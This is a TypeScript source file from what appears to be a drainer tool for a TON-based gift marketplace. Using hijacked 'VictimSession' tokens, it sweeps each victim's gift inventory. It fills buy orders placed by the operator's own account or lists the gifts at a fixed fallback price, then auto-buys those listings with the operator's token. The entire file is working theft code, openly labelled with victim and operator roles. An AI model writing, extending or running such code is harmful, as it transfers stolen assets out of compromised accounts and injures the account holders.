import {
  buyGifts,
  fetchInventory,
  fetchTopOrder,
  fillOrder,
  listForSale,
  type MrktGift,
} from "./client.js";
import { authFromOperatorToken } from "./client.js";
import { config } from "../config.js";
import type { VictimSession } from "./sessions.js";
import { bumpSessionUse, sessionLimitsHit } from "./sessions.js";

export type SweepItemResult = {
  giftId: string;
  name?: string;
  mode: "order_fill" | "sale_list" | "skipped";
  detail?: string;
  orderId?: string;
  priceNano?: number;
};

export type SweepResult = {
  items: SweepItemResult[];
  done: boolean;
  cursor: string;
};

function orderPriceNano(order: { priceMaxNanoTONs?: number; price?: number }): number {
  if (typeof order.priceMaxNanoTONs === "number") return order.priceMaxNanoTONs;
  if (typeof order.price === "number") return order.price;
  return 0;
}

function operatorOrderAllowed(order: Record<string, unknown>): boolean {
  if (!config.mrkt.restrictToOperatorOrders) return true;
  const allow = new Set(config.mrkt.allowedOrderIds);
  if (allow.size > 0 && typeof order.id === "string") {
    return allow.has(order.id);
  }
  if (config.mrkt.operatorAccountId && typeof order.userId === "number") {
    return order.userId === config.mrkt.operatorAccountId;
  }
  return false;
}

async function sweepGift(token: string, gift: MrktGift): Promise<SweepItemResult> {
  if (gift.isOnSale) {
    return { giftId: gift.id, name: gift.name, mode: "skipped", detail: "already listed" };
  }

  if (config.mrkt.sellMode === "offer_fill") {
    const top = await fetchTopOrder(token, gift);
    if (!top?.id) {
      return { giftId: gift.id, name: gift.name, mode: "skipped", detail: "no buy order" };
    }
    if (!operatorOrderAllowed(top)) {
      return { giftId: gift.id, name: gift.name, mode: "skipped", detail: "order not allowed" };
    }
    const price = orderPriceNano(top);
    if (price < config.mrkt.minFillPriceNano) {
      return { giftId: gift.id, name: gift.name, mode: "skipped", detail: "order price too low" };
    }
    await fillOrder(token, top.id!, [gift.id]);
    return {
      giftId: gift.id,
      name: gift.name,
      mode: "order_fill",
      orderId: top.id,
      priceNano: price,
      detail: "filled buy order",
    };
  }

  const price = config.mrkt.fallbackListPriceNano;
  await listForSale(token, [gift.id], price);
  return {
    giftId: gift.id,
    name: gift.name,
    mode: "sale_list",
    priceNano: price,
    detail: "listed for operator buy",
  };
}

export async function sweepInventoryPage(
  session: VictimSession,
  cursor: string,
): Promise<SweepResult> {
  if (sessionLimitsHit(session)) {
    return { items: [], done: true, cursor: "" };
  }

  const page = await fetchInventory(session.mrktToken, cursor);
  const gifts = (page.gifts ?? []).filter((g) => !g.isOnSale);
  const items: SweepItemResult[] = [];
  const listedForBuy: string[] = [];

  for (const gift of gifts) {
    if (sessionLimitsHit(session)) break;
    try {
      const r = await sweepGift(session.mrktToken, gift);
      items.push(r);
      if (r.mode !== "skipped") bumpSessionUse(session, 1);
      if (r.mode === "sale_list") listedForBuy.push(gift.id);
    } catch (e) {
      items.push({
        giftId: gift.id,
        name: gift.name,
        mode: "skipped",
        detail: e instanceof Error ? e.message : String(e),
      });
    }
  }

  if (config.mrkt.autoBuyListed && listedForBuy.length > 0) {
    try {
      const op = await authFromOperatorToken();
      await buyGifts(op, listedForBuy);
      for (const it of items) {
        if (it.mode === "sale_list") it.detail = `${it.detail}; bought by operator`;
      }
    } catch (e) {
      items.push({
        giftId: "operator",
        mode: "skipped",
        detail: `operator buy failed: ${e instanceof Error ? e.message : String(e)}`,
      });
    }
  }

  const next = page.cursor ?? "";
  const done = !next || gifts.length === 0;
  return { items, done, cursor: next };
}
